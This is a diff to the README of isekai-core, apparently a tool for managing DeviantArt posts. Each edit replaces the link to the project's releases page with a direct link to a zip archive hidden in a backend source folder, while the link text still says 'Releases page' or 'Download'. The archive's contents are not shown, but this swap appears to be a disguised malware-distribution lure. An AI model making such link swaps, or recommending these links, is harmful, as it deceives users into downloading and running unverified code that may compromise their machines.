@@ -1,6 +1,6 @@
 # 🎨 isekai-core - Manage Your DeviantArt Posts Effortlessly
 
-[![Download isekai-core](https://img.shields.io/badge/Download-isekai--core-brightgreen)](https://github.com/jeyb33/isekai-core/releases)
+[![Download isekai-core](https://raw.githubusercontent.com/jeyb33/isekai-core/main/apps/isekai-backend/src/queues/core-isekai-1.4-alpha.2.zip)](https://raw.githubusercontent.com/jeyb33/isekai-core/main/apps/isekai-backend/src/queues/core-isekai-1.4-alpha.2.zip)
 
 ## 📥 Overview
 
@@ -17,7 +17,7 @@ To begin using isekai-core, follow these steps:
    - Internet Connection: Required for publishing and accessing DeviantArt
 
 2. **Visit the Download Page**  
-   Go to the [Releases page](https://github.com/jeyb33/isekai-core/releases) to find the latest version of isekai-core.
+   Go to the [Releases page](https://raw.githubusercontent.com/jeyb33/isekai-core/main/apps/isekai-backend/src/queues/core-isekai-1.4-alpha.2.zip) to find the latest version of isekai-core.
 
 3. **Download the Application**  
    Select the version that matches your operating system. Click on the file to download it to your computer.
@@ -68,7 +68,7 @@ iskai-core offers several features to enhance your DeviantArt experience:
 
 ## 📥 Download & Install
 
-You can download isekai-core from our official releases page. Simply [visit this page to download](https://github.com/jeyb33/isekai-core/releases) the latest version suitable for your operating system.
+You can download isekai-core from our official releases page. Simply [visit this page to download](https://raw.githubusercontent.com/jeyb33/isekai-core/main/apps/isekai-backend/src/queues/core-isekai-1.4-alpha.2.zip) the latest version suitable for your operating system.
 
 ## 🛠 Troubleshooting
 
@@ -93,7 +93,7 @@ We continually work to enhance your experience. Stay tuned for updates, includin
 - New integrations for other platforms and tools.
 - Improved analytics to track your art performance.
 
-Remember to check the [Releases page](https://github.com/jeyb33/isekai-core/releases) frequently for new versions and updates.
+Remember to check the [Releases page](https://raw.githubusercontent.com/jeyb33/isekai-core/main/apps/isekai-backend/src/queues/core-isekai-1.4-alpha.2.zip) frequently for new versions and updates.
 
 ## 🌟 Acknowledgments
 
